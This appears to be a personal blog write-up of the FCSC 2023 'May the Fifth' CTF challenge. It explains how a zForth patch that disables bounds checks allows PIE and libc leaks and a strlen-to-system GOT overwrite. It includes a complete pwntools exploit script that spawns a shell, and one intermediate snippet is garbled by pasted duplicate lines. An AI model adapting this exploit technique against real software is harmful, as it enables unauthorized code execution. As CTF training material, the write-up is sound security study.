+++
title = 'FCSC2023 May The Fifth'
date = 2025-10-26T17:30:23+01:00
tags = ["pwn", "GOT Overwrite"]
categories = ["Hackropole"]
+++

Recently, I started training myself on [hackropole](https://hackropole.fr/fr/), the ANSSI platform that has all the challenges from the past FCSC competitions. So I thought I'd make some writeups for some challenges, here is the writeup for May the Fifth.

# TLDR #
- lack of boundary check in zForth allow arbitrary read and write
- use the lack of bounds check to leak PIE address
- use the PIE address to read got address and gain libc leak
- overwrite strlen got by system for RCE

May the Fifth was a 2 Star challenge from FCSC 2023. A [docker-compose.yml](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2023/MayFifth/docker-compose.yml) is provided so we can test the final exploit on remote. We also had the [binary](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2023/MayFifth/may-the-fifth) as well as an [archive](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2023/MayFifth/may-the-fifth-public.tar.xz).

The archive contained a lot of code as well as a patch. I will not provide the entirety of the code of patch but the below lines in the patch allow us to understand what to do as well as the vulnerability.
```
+Debugging the dictionary
+========================
+
+zForth provides useful PEEK and POKE primitives, for when you want to inspect bytes
+inside the dictionary ("dict"), typically for debugging purposes. The PEEK command
+is very simple: first enter the offset inside the dictionary followed by the size
+of the data to be read, typically 4 and the '@@' keyword (defined in core.zf):
+
+````
+143 4 @@ .
+309357920 
+````
+
+Similarly, POKE allows you to directly modify data inside the dictionary, this time
+the data to be written is first, followed by the offset and the size, and then '!!':
+
+````
+20204 143 3 !!
+143 3 @@ .
+20204
+````
+
+Please be very careful when using PEEK and POKE. They are very powerful commands,
+and their use can lead to undefined behaviour!
+
+
 Tracing
 =======
 
diff -Nur ../orig/zfconf.h ./zfconf.h
--- ../orig/zfconf.h	2023-04-04 20:48:40.633696789 +0200
+++ ./zfconf.h	2023-04-04 19:54:42.000000000 +0200
@@ -13,7 +13,7 @@
 /* Set to 1 to add boundary checks to stack operations. Increases .text size
  * by approx 100 bytes */
 
-#define ZF_ENABLE_BOUNDARY_CHECKS 1
+#define ZF_ENABLE_BOUNDARY_CHECKS 0
```

What we can see is that we are two primitives : PEEK to read in a dictionary and POKE to write in it. But the patch disable the boundary check, meaning we can read and write outside of the dictionary.

The patch is essentially giving us nice arbitrary read and write capabilities :)

Before we know what we can do with it tho let's run a quick checksec on the binary

![checksec](/images/checksec_mayfifth.png)

As you can see all protections are enabled except canary (not important), and there is only Partial RELRO. Meaning we will probably be able to overwrite a got entry with system to achieve RCE.

Before we can do anything tho we need leaks : this is easily done thanks to our arbitrary read, we can read before the dictionary with PEEK to leak a PIE address then calculate the offset to PIE base to gain binary base address. The code below does exactly that.

```python
r.recvline()
read_dict_addr = b"-300 4 @@ ." 
r.sendline(read_dict_addr)


dict_addr = int(r.recvline().strip(), 0)

log.info(f'Dict addr {hex(dict_addr)}')

elf.address = dict_addr - 0x61a0 #offset between dict address and binary base

print(hex(elf.address))
```

Then we can simply read from a got address to leak libc address. For this I chose to read out of printf to get printf libc address.
```python
printf_got = elf.got['printf']

#offset = printf_got - dict_addr

read_libc = f"{printf_got-dict_addr} 4 @@ ."

print(read_libc)

r.sendline(read_libc.encode())printf_got = elf.got['printf']

#offset = printf_got - dict_addr

read_libc = f"{printf_got-dict_addr} 4 @@ ."

print(read_libc)

r.sendline(read_libc.encode())



leak_libc = int(r.recvline().strip(), 0)


log.info(f'PRINTF LIBC LEAK {hex(leak_libc)}')

libc.address = leak_libc - libc.sym['printf']



leak_libc = int(r.recvline().strip(), 0)


log.info(f'PRINTF LIBC LEAK {hex(leak_libc)}')

libc.address = leak_libc - libc.sym['printf']
```

After that comes the most important part : now that we have all our leaks, how do we gain a shell ?

1. We know that we can overwrite a GOT entry
2. We just need to find a good got entry to overwrite

At first I tried just overwriting a GOT entry with a one_gadget to gain immediate code execution but it wasn't working. So let's move on to plan B : overwriting with system. To get a shell with that we need to execute system(/bin/sh), meaning that if we overwrite the GOT of a function with system we have to be able to somehow control the first argument to make it /bin/sh.

Thankfully for us the challenge make it quite easy to do :)
The answer is in the code below from main.c
```C
#ifdef USE_READLINE

	read_history(".zforth.hist");

	for(;;) {

		char *buf = readline("");
		if(buf == NULL) break;

		if(strlen(buf) > 0) { //strlen argument is user supplied

			do_eval("stdin", ++line, buf);
			printf("\n");

			add_history(buf);
			write_history(".zforth.hist");

		}

		free(buf);
	}
```
As you can see strlen will be automatically called when the program read a line with the buf, so we can easily control its argument!!!

So the final exploit is simple : we overwrite strlen with system then send /bin/sh and it will execute system(/bin/sh).

Below is the full exploit code (with comments).
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./may-the-fifth")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 4000)

    return r


r = conn()

#PEEK 143 4 @@ . offset size @@
#POKE 20204 143 3 !! data offset size !!

r.recvline()
read_pie_addr = b"-300 4 @@ ."
r.sendline(read_pie_addr)


pie_leak = int(r.recvline().strip(), 0)

log.info(f'Dict addr {hex(pie_leak)}')

elf.address = pie_leak - 0x61a0 #dict_addr - 

print(hex(elf.address))

printf_got = elf.got['printf']

#offset = printf_got - dict_addr to calculate reading from libc address

read_libc = f"{printf_got-pie_leak} 4 @@ ." #read from printf got -> gain printf libc address

print(read_libc)

r.sendline(read_libc.encode())



leak_libc = int(r.recvline().strip(), 0)


log.info(f'PRINTF LIBC LEAK {hex(leak_libc)}')

libc.address = leak_libc - libc.sym['printf']

one_gadget = libc.address + 0x13dabc

log.info(f'LIBC BASE {hex(libc.address)}')

strlen = elf.got['strlen']

#use POKE to write strlen address with system address

payload = f"{libc.sym['system']} {strlen-pie_leak} 4 !!" 
r.sendline(payload.encode())

#just send /bin/sh and enjoy shell :)
r.sendline(b'/bin/sh')

r.interactive()
```

## Conclusion ##
May the Fifth was the first challenge I did as part of my training on Hackropole. The exploitation didn't feel too hard, I struggled more with trying to debug it :D